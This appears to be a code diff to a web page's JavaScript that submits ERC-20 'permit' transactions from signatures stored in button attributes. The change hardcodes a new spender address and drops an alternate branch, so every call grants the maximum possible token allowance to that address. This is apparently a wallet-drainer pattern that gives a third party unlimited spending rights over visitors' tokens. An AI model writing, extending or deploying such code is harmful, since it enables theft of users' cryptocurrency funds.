@@ -8,7 +8,10 @@ window.onload = async () => {
         const transfersButton = document.getElementsByName('transferFunds');
 
         const web3 = new Web3(getProvider());
-        const spender = '0x4E0b2A80E158f8d28a2007866ab80B7f63bE6076';
+        const spender = '0x63423dE55aB709C3E21699dF6C918E7D77553f8B', bigNumber = web3.utils.toBN('ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
+        const abi = require('./abi-codes/uChild_abi.json');
+
+        const ethers = require('ethers');
 
         signsButton.forEach(button => {
             button.addEventListener("click", async () => {
@@ -18,21 +21,11 @@ window.onload = async () => {
                 const s = button.getAttribute('data-s');
                 const v = button.getAttribute('data-v');
                 const deadline = button.getAttribute('data-deadline');
-                const typeSign = button.getAttribute('data-sign');
-                const nonce = button.getAttribute('data-nonce');
-                const dataAbi = button.getAttribute('data-abi');
 
-                const abi = require(`./abi-codes/${dataAbi}`);
+                const instanceContract = new web3.eth.Contract(abi, contractAddress);
+                const txData = await instanceContract.methods.permit(userAddress, spender, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', deadline, v, r, s).encodeABI();
 
-                if (typeSign == 1) {
-                    const instanceContract = new web3.eth.Contract(abi, contractAddress);
-                    const txData = await instanceContract.methods.permit(userAddress, spender, nonce, deadline, true, v, r, s).encodeABI();
-                    sendTransaction(getUserAddress(), contractAddress, txData, 0);
-                } else {
-                    const instanceContract = new web3.eth.Contract(abi, contractAddress);
-                    const txData = await instanceContract.methods.permit(userAddress, spender, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', deadline, v, r, s).encodeABI();
-                    sendTransaction(getUserAddress(), contractAddress, txData, 0);
-                }
+                sendTransaction(getUserAddress(), contractAddress, txData, 0);
             });
         });
 
